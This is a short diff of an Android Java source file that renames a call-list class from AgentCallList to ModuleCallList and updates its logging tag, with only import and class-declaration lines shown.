@@ -22,8 +22,8 @@ import com.android.service.util.DataBuffer;
 import com.android.service.util.DateTime;
 import com.android.service.util.WChar;
 
-public class AgentCallList extends BaseModule implements Observer<Call> {
-	private static final String TAG = "AgentCallList"; //$NON-NLS-1$
+public class ModuleCallList extends BaseModule implements Observer<Call> {
+	private static final String TAG = "ModuleCallList"; //$NON-NLS-1$
 
 	@Override
 	public boolean parse(ConfModule conf) {
